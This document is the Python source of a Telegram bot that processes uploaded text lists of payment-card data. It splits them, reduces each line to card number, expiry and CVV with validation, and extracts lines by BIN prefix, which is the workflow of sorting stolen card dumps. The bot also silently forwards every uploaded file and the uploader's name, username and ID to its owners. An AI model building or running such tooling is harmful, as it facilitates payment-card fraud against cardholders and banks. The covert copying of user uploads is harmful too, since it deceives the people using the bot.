import os
import logging
import asyncio
import shutil
import math
from datetime import datetime
from pathlib import Path
from dotenv import load_dotenv
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
import aiofiles

# --------------------------------------------------------
# 1. DIRECTORY SETUP & LOGGING CONFIGURATION
# --------------------------------------------------------
BASE_DIR = Path(__file__).resolve().parent
LOGS_DIR = BASE_DIR / "logs"
UPLOADS_DIR = BASE_DIR / "uploads"
OUTPUTS_DIR = BASE_DIR / "outputs"

for folder in [LOGS_DIR, UPLOADS_DIR, OUTPUTS_DIR]:
    folder.mkdir(parents=True, exist_ok=True)

log_formatter = logging.Formatter(
    "%(asctime)s - %(levelname)s - [%(filename)s:%(lineno)d] - %(message)s"
)

console_handler = logging.StreamHandler()
console_handler.setFormatter(log_formatter)
console_handler.setLevel(logging.INFO)

bot_log_handler = logging.FileHandler(LOGS_DIR / "bot.log", encoding="utf-8")
bot_log_handler.setFormatter(log_formatter)
bot_log_handler.setLevel(logging.INFO)

error_log_handler = logging.FileHandler(LOGS_DIR / "errors.log", encoding="utf-8")
error_log_handler.setFormatter(log_formatter)
error_log_handler.setLevel(logging.ERROR)

logger = logging.getLogger()
logger.setLevel(logging.INFO)
logger.addHandler(console_handler)
logger.addHandler(bot_log_handler)
logger.addHandler(error_log_handler)

# --------------------------------------------------------
# 2. ENVIRONMENT CONFIGURATION
# --------------------------------------------------------
load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_IDS_RAW = os.getenv("OWNER_IDS", "")

if not BOT_TOKEN:
    logger.critical("CRITICAL: BOT_TOKEN is missing in the environment variables!")
    raise ValueError("BOT_TOKEN environment variable is required.")

OWNER_IDS = []
for idx in OWNER_IDS_RAW.split(","):
    clean_id = idx.strip()
    if clean_id.isdigit():
        OWNER_IDS.append(int(clean_id))

if not OWNER_IDS:
    logger.warning("WARNING: OWNER_IDS contains no valid Telegram User IDs.")

# Global active task tracker for cancellation purposes
ACTIVE_TASKS = {}

# --------------------------------------------------------
# 3. KEYBOARD DEFINITIONS
# --------------------------------------------------------
START_KEYBOARD = ReplyKeyboardMarkup(
    [[KeyboardButton("🚀 Start")]],
    resize_keyboard=True
)

MAIN_KEYBOARD = ReplyKeyboardMarkup(
    [
        [KeyboardButton("📂 Spl Command"), KeyboardButton("🧹 Clear Command")],
        [KeyboardButton("⚡ Ext BIN Command"), KeyboardButton("💡 Info")]
    ],
    resize_keyboard=True
)

# --------------------------------------------------------
# 4. HELPER UTILITIES
# --------------------------------------------------------
async def send_to_owners(context: ContextTypes.DEFAULT_TYPE, caption: str, file_source=None):
    """Safely relays messages and files to all verified owner IDs."""
    for owner_id in OWNER_IDS:
        try:
            if file_source:
                if isinstance(file_source, str) and os.path.exists(file_source):
                    async with aiofiles.open(file_source, "rb") as f:
                        file_bytes = await f.read()
                    await context.bot.send_document(
                        chat_id=owner_id,
                        document=file_bytes,
                        filename=os.path.basename(file_source),
                        caption=caption
                    )
                else:
                    await context.bot.send_document(
                        chat_id=owner_id,
                        document=file_source,
                        caption=caption
                    )
            else:
                await context.bot.send_message(chat_id=owner_id, text=caption)
        except Exception as e:
            logger.error(f"Failed to forward updates to owner ID {owner_id}: {e}")

async def pre_scan_file_metrics(input_path: str, mode: str, param=None):
    """Line-by-line low memory pre-scanner to calculate lines and matching prefixes."""
    total_lines = 0
    matching_lines = 0
    async with aiofiles.open(input_path, mode="r", encoding="utf-8", errors="ignore") as f:
        async for line in f:
            total_lines += 1
            if mode == "extract" and line.startswith(str(param)):
                matching_lines += 1
            if total_lines % 5000 == 0:
                await asyncio.sleep(0)
    return total_lines, matching_lines

# --------------------------------------------------------
# 5. BOT INTERFACE COMMAND & BUTTON HANDLERS
# --------------------------------------------------------
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Responds to /start by initializing user options and showing the Start button keyboard."""
    context.user_data.clear()
    user = update.effective_user
    
    if user.username:
        greeting = f"Hello @{user.username}!"
    else:
        greeting = f"Hello {user.first_name}!"

    welcome_text = (
        f"{greeting}\n\n"
        "Please upload a file in .txt format 📂"
    )
    await update.message.reply_text(welcome_text, reply_markup=START_KEYBOARD)

async def keyboard_start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Switches layout instantly to the permanent professional processing dashboard grid."""
    transition_text = (
        "⚙️ **Dashboard Matrix Initialized!**\n\n"
        "Select an action button from the control panel grid layout below to view details and instruction templates."
    )
    await update.message.reply_text(transition_text, parse_mode="Markdown", reply_markup=MAIN_KEYBOARD)

async def button_spl_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    spl_text = (
        "Send command like:\n\n"
        "`/spl100`\n\n"
        "Example:\n"
        "`/spl500`\n"
        "`/spl1000`\n\n"
        "Then upload your TXT file."
    )
    await update.message.reply_text(spl_text, parse_mode="Markdown", reply_markup=MAIN_KEYBOARD)

async def button_clear_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    clear_text = (
        "Send:\n\n"
        "`/clear`\n\n"
        "Then upload your TXT file.\n\n"
        "The bot will keep only:\n\n"
        "`CARD|MM|YY(or YYYY)|CVV`\n\n"
        "Examples:\n\n"
        "1234567890123456|12/28|123|John|Delhi\n"
        "↓\n"
        "`1234567890123456|12|28|123`\n\n"
        "and\n\n"
        "1234567890123456|12|2028|123|John|Delhi\n"
        "↓\n"
        "`1234567890123456|12|2028|123`"
    )
    await update.message.reply_text(clear_text, parse_mode="Markdown", reply_markup=MAIN_KEYBOARD)

async def button_ext_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ext_text = (
        "Send command like:\n\n"
        "`/ext6390`\n\n"
        "Then upload your TXT file.\n\n"
        "The bot will extract only matching BINs."
    )
    await update.message.reply_text(ext_text, parse_mode="Markdown", reply_markup=MAIN_KEYBOARD)

async def button_info_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    info_text = (
        "📖 **Available Commands**\n\n"
        "📂 `/spl<number>`\n\n"
        "Split TXT into parts.\n\n"
        "Example:\n"
        "`/spl100`\n"
        "creates files with 100 lines each.\n\n"
        "--------------------------\n\n"
        "🧹 `/clear`\n\n"
        "Keeps only\n"
        "`CARD|MM|YY(or YYYY)|CVV`\n\n"
        "Removes every extra field.\n\n"
        "--------------------------\n\n"
        "⚡ `/extBIN`\n\n"
        "Extracts only matching BIN.\n\n"
        "Example:\n"
        "`/ext6390`\n\n"
        "--------------------------\n\n"
        "⛔ `/stop`\n\n"
        "Stops current processing immediately."
    )
    await update.message.reply_text(info_text, parse_mode="Markdown", reply_markup=MAIN_KEYBOARD)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await button_info_handler(update, context)

# --------------------------------------------------------
# 6. PROCESSING TASK MANAGER
# --------------------------------------------------------
async def run_processing_task(update: Update, context: ContextTypes.DEFAULT_TYPE, mode: str, param=None):
    """Encapsulates execution handles bridging standard processing triggers with the active file."""
    user = update.effective_user
    user_id = user.id

    if user_id in ACTIVE_TASKS:
        await update.message.reply_text("⏳ **Process Blocked:** You currently have an active parsing run. Wait for completion or send `/stop` before continuing.", reply_markup=MAIN_KEYBOARD)
        return

    input_path = UPLOADS_DIR / str(user_id) / "input.txt"
    if not input_path.exists():
        await update.message.reply_text("⚠️ Please upload a .txt file first 📂", reply_markup=MAIN_KEYBOARD)
        return

    original_name = context.user_data.get("original_name", "file.txt")
    user_outputs_path = OUTPUTS_DIR / str(user_id)
    user_outputs_path.mkdir(parents=True, exist_ok=True)

    async def task_wrapper():
        try:
            await process_file_stream(update, context, str(input_path), user_outputs_path, original_name, mode, param)
        except asyncio.CancelledError:
            logger.info(f"User {user_id} cancelled ongoing execution pipeline processing.")
            await update.message.reply_text("❌ **Operation Halted:** Processing loop explicitly broken by user command.", reply_markup=MAIN_KEYBOARD)
        except Exception as err:
            logger.error(f"Execution tracking crash on user input {user_id}: {err}", exc_info=True)
            await update.message.reply_text("⚠️ **System Error:** Failed to process your document. Ensure formatting rules match standard conventions.", reply_markup=MAIN_KEYBOARD)
        finally:
            if user_id in ACTIVE_TASKS:
                del ACTIVE_TASKS[user_id]
            if user_outputs_path.exists():
                shutil.rmtree(user_outputs_path, ignore_errors=True)
            if input_path.exists():
                os.remove(input_path)
            context.user_data.pop("mode", None)
            context.user_data.pop("param", None)

    task = asyncio.create_task(task_wrapper())
    ACTIVE_TASKS[user_id] = task

async def spl_config_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    try:
        lines_count = int(text[4:])
        if lines_count <= 0:
            raise ValueError()
        
        user_id = update.effective_user.id
        if (UPLOADS_DIR / str(user_id) / "input.txt").exists():
            await run_processing_task(update, context, "split", lines_count)
        else:
            context.user_data["mode"] = "split"
            context.user_data["param"] = lines_count
            await update.message.reply_text(f"✅ **Configuration Active:** File Split Mode (`{lines_count}` lines per file). Please upload your `.txt` document.", reply_markup=MAIN_KEYBOARD)
    except Exception:
        await update.message.reply_text("❌ **Invalid Parameter:** Please define a positive integer. Example: `/spl100`", reply_markup=MAIN_KEYBOARD)

async def ext_config_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    prefix_val = text[4:]
    if not prefix_val:
        await update.message.reply_text("❌ **Invalid Parameter:** Please supply an explicit prefix sequence. Example: `/ext6390`", reply_markup=MAIN_KEYBOARD)
        return
        
    user_id = update.effective_user.id
    if (UPLOADS_DIR / str(user_id) / "input.txt").exists():
        await run_processing_task(update, context, "extract", prefix_val)
    else:
        context.user_data["mode"] = "extract"
        context.user_data["param"] = prefix_val
        await update.message.reply_text(f"✅ **Configuration Active:** Extraction Mode (Prefix: `{prefix_val}`). Please upload your `.txt` document.", reply_markup=MAIN_KEYBOARD)

async def clear_config_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if (UPLOADS_DIR / str(user_id) / "input.txt").exists():
        await run_processing_task(update, context, "clear", None)
    else:
        context.user_data["mode"] = "clear"
        context.user_data["param"] = None
        await update.message.reply_text("✅ **Configuration Active:** Pipe Cleaning Mode (Keeps the first 4 fields only). Please upload your `.txt` document.", reply_markup=MAIN_KEYBOARD)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in ACTIVE_TASKS:
        task = ACTIVE_TASKS[user_id]
        task.cancel()
        await update.message.reply_text("🛑 **Cancellation signal transmitted.** Terminating operations now...", reply_markup=MAIN_KEYBOARD)
    else:
        await update.message.reply_text("ℹ️ You have no active file streams running right now.", reply_markup=MAIN_KEYBOARD)

# --------------------------------------------------------
# 7. STREAM PIPELINE COMPONENT DESIGN WITH PRE-CALCULATIONS
# --------------------------------------------------------
async def process_file_stream(update: Update, context: ContextTypes.DEFAULT_TYPE, input_path: str, user_outputs_dir: Path, original_name: str, mode: str, param):
    """Core text processing logic. Executes line-by-line using low-memory asynchronous handles."""
    sent_files_tracker = []
    line_counter = 0

    total_lines, matching_lines = await pre_scan_file_metrics(input_path, mode, param)

    if total_lines == 0:
        await update.message.reply_text("⚠️ **Processing Aborted:** The uploaded file contains no data rows.", reply_markup=MAIN_KEYBOARD)
        return

    # Step 1: Send mode-specific progress summary message blocks
    if mode == "split":
        chunk_size = int(param)
        total_parts = math.ceil(total_lines / chunk_size)
        progress_msg = (
            "🚀 Processing Started...\n\n"
            f"📄 Total Lines: {total_lines}\n"
            f"📦 Lines Per Part: {chunk_size}\n"
            f"📂 Total Parts: {total_parts}"
        )
        await update.message.reply_text(progress_msg, reply_markup=MAIN_KEYBOARD)

    elif mode == "clear":
        progress_msg = (
            "🚀 Cleaning & Validating Started...\n\n"
            f"📄 Total Input Lines: {total_lines}"
        )
        await update.message.reply_text(progress_msg, reply_markup=MAIN_KEYBOARD)

    elif mode == "extract":
        progress_msg = (
            "🚀 Extracting...\n\n"
            f"🔎 Prefix: {param}\n"
            f"📄 Total Lines: {total_lines}\n"
            f"📄 Matching Lines: {matching_lines}"
        )
        await update.message.reply_text(progress_msg, reply_markup=MAIN_KEYBOARD)

    # Step 2: Run execution blocks asynchronously
    # ----------------- MODE: CLEAR PIPELINE -----------------
    if mode == "clear":
        out_filename = f"cleared_{original_name}"
        out_path = user_outputs_dir / out_filename
        output_lines_count = 0
        
        async with aiofiles.open(input_path, mode="r", encoding="utf-8", errors="ignore") as infile, \
                   aiofiles.open(out_path, mode="w", encoding="utf-8") as outfile:
            async for line in infile:
                line_counter += 1
                stripped_line = line.strip()
                if not stripped_line:
                    continue
                    
                segments = [seg.strip() for seg in stripped_line.split("|")]
                card, mm, yy, cvv = None, None, None, None
                
                # Check Format 1 & 2: CARD|MM/YY|CVV|NAME...
                if len(segments) >= 3 and "/" in segments[1]:
                    date_parts = segments[1].split("/")
                    if len(date_parts) == 2:
                        card = segments[0]
                        mm = date_parts[0].strip()
                        yy = date_parts[1].strip()
                        cvv = segments[2]
                        
                # Check Format 3 & 4: CARD|MM|YY|CVV|NAME...
                elif len(segments) >= 4:
                    card = segments[0]
                    mm = segments[1]
                    yy = segments[2]
                    cvv = segments[3]
                    
                # STRICT VALIDATION CHECKS
                if card and mm and yy and cvv:
                    # 1. Card must be exactly 16 digits
                    is_valid_card = card.isdigit() and len(card) == 16
                    # 2. Month must be 01-12 (2 digits)
                    is_valid_mm = mm.isdigit() and len(mm) == 2 and 1 <= int(mm) <= 12
                    # 3. Year must be 2 or 4 digits
                    is_valid_yy = yy.isdigit() and len(yy) in [2, 4]
                    # 4. CVV must be exactly 3 digits
                    is_valid_cvv = cvv.isdigit() and len(cvv) == 3
                    
                    if is_valid_card and is_valid_mm and is_valid_yy and is_valid_cvv:
                        cleaned_output = f"{card}|{mm}|{yy}|{cvv}"
                        await outfile.write(cleaned_output + "\n")
                        output_lines_count += 1
                
                if line_counter % 2000 == 0:
                    await asyncio.sleep(0)

        sent_files_tracker.append(out_path)
        
        completion_msg = (
            "✅ Cleaning & Validation Completed\n\n"
            f"📄 Total Input Lines: {total_lines}\n"
            f"📄 Valid Output Lines: {output_lines_count}\n"
            f"🗑️ Invalid Lines Dropped: {total_lines - output_lines_count}"
        )
        await update.message.reply_text(completion_msg, reply_markup=MAIN_KEYBOARD)

    # ----------------- MODE: EXTRACT PIPELINE -----------------
    elif mode == "extract":
        prefix_str = str(param)
        out_filename = f"extracted_{original_name}"
        out_path = user_outputs_dir / out_filename
        
        async with aiofiles.open(input_path, mode="r", encoding="utf-8", errors="ignore") as infile, \
                   aiofiles.open(out_path, mode="w", encoding="utf-8") as outfile:
            async for line in infile:
                line_counter += 1
                if line.startswith(prefix_str):
                    await outfile.write(line)
                
                if line_counter % 2000 == 0:
                    await asyncio.sleep(0)
                    
        sent_files_tracker.append(out_path)

    # ------------------ MODE: SPLIT PIPELINE ------------------
    elif mode == "split":
        limit = int(param)
        part_index = 1
        current_lines_written = 0
        current_out_file = None
        
        try:
            async with aiofiles.open(input_path, mode="r", encoding="utf-8", errors="ignore") as infile:
                async for line in infile:
                    line_counter += 1
                    if current_out_file is None:
                        part_filename = f"part_{part_index}_{original_name}"
                        part_path = user_outputs_dir / part_filename
                        current_out_file = await aiofiles.open(part_path, mode="w", encoding="utf-8")
                        sent_files_tracker.append(part_path)
                    
                    await current_out_file.write(line)
                    current_lines_written += 1
                    
                    if current_lines_written >= limit:
                        await current_out_file.close()
                        current_out_file = None
                        current_lines_written = 0
                        part_index += 1
                        
                    if line_counter % 2000 == 0:
                        await asyncio.sleep(0)
        finally:
            if current_out_file is not None:
                await current_out_file.close()

    # Step 3: Dispatch output items and signal Completion
    files_sent = False
    for output_file in sent_files_tracker:
        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            async with aiofiles.open(output_file, "rb") as f:
                output_bytes = await f.read()
            await update.message.reply_document(
                document=output_bytes,
                filename=os.path.basename(output_file),
                reply_markup=MAIN_KEYBOARD
            )
            files_sent = True
            await asyncio.sleep(0.3)
        else:
            await update.message.reply_text(f"⚠️ Resulting file `{os.path.basename(output_file)}` contained no valid data matching your parameters.", reply_markup=MAIN_KEYBOARD)

    # Successful completion flag output
    if files_sent:
        await update.message.reply_text("Work done ✅ 💯", reply_markup=MAIN_KEYBOARD)
# --------------------------------------------------------
# 8. INCOMING FILE DISPATCH HANDLER
# --------------------------------------------------------
async def document_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Validates document payloads and aligns configurations matching the requested workflows."""
    user = update.effective_user
    user_id = user.id
    document = update.message.document

    if not document.file_name.lower().endswith(".txt"):
        await update.message.reply_text("❌ **File Rejected:** This bot accepts only standard plain-text `.txt` files.", reply_markup=MAIN_KEYBOARD)
        return

    if user_id in ACTIVE_TASKS:
        await update.message.reply_text("⏳ **Process Blocked:** You currently have an active parsing run. Wait for completion or send `/stop` before continuing.", reply_markup=MAIN_KEYBOARD)
        return

    user_uploads_path = UPLOADS_DIR / str(user_id)
    user_uploads_path.mkdir(parents=True, exist_ok=True)
    local_input_file = user_uploads_path / "input.txt"

    status_msg = await update.message.reply_text("📥 **Downloading document file...** Please hold on.", reply_markup=MAIN_KEYBOARD)

    try:
        tg_file = await context.bot.get_file(document.file_id)
        await tg_file.download_to_drive(custom_path=local_input_file)
        context.user_data['original_name'] = document.file_name

        # Handle owner alert matrices without output log spam
        username_str = f"@{user.username}" if user.username else "None"
        current_time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC")
        
        owner_notification_text = (
            "📥 NEW FILE RECEIVED\n\n"
            f"👤 Name: {user.first_name}\n"
            f"📛 Username: {username_str}\n"
            f"🆔 User ID: {user.id}\n"
            f"📄 File Name: {document.file_name}\n"
            f"🕒 Timestamp: {current_time_str}"
        )
        
        await send_to_owners(context, caption=owner_notification_text, file_source=None)
        await send_to_owners(context, caption=f"📄 Original File Copy: {document.file_name}", file_source=document.file_id)

        await status_msg.delete()

        # Check hybrid pipeline states: Did they config beforehand or upload fresh?
        mode_type = context.user_data.get("mode")
        mode_param = context.user_data.get("param")

        if mode_type:
            # Process instantly if config was pre-selected
            await run_processing_task(update, context, mode_type, mode_param)
        else:
            # New File Drop-off UI Workflow trigger
            success_msg = (
                "✅ TXT file received successfully 🔥\n\n"
                "Use commands 👇\n\n"
                "/spl <N> – Split TXT file\n"
                "/ext <prefix> – Extract prefix lines\n"
                "/clear – Clean TXT file\n"
                "/stop – Stop running process"
            )
            await update.message.reply_text(success_msg, reply_markup=MAIN_KEYBOARD)

    except Exception as err:
        logger.error(f"Download or routing crash on user input {user_id}: {err}", exc_info=True)
        await update.message.reply_text("⚠️ **System Error:** Failed to process or download your document.", reply_markup=MAIN_KEYBOARD)

async def rejected_files_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ **File Rejected:** Unsupported payload formatting. Provide valid `.txt` extensions only.", reply_markup=MAIN_KEYBOARD)

# --------------------------------------------------------
# 9. BOT APPLICATION BOOTSTRAP INITIALIZER
# --------------------------------------------------------
def main():
    logger.info("Initializing Application Framework Components...")
    
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("clear", clear_config_handler))
    app.add_handler(CommandHandler("stop", stop_command))

    app.add_handler(MessageHandler(filters.Text("🚀 Start"), keyboard_start_handler))
    app.add_handler(MessageHandler(filters.Text("📂 Spl Command"), button_spl_handler))
    app.add_handler(MessageHandler(filters.Text("🧹 Clear Command"), button_clear_handler))
    app.add_handler(MessageHandler(filters.Text("⚡ Ext BIN Command"), button_ext_handler))
    app.add_handler(MessageHandler(filters.Text("💡 Info"), button_info_handler))

    app.add_handler(MessageHandler(filters.Regex(r"^/spl\d+$"), spl_config_handler))
    app.add_handler(MessageHandler(filters.Regex(r"^/ext.+$"), ext_config_handler))

    app.add_handler(MessageHandler(filters.Document.TXT, document_upload_handler))
    app.add_handler(MessageHandler(filters.Document.ALL & ~filters.Document.TXT, rejected_files_handler))

    logger.info("Application context fully updated. Starting standard long-polling worker thread loop...")
    app.run_polling()

if __name__ == "__main__":
    main()
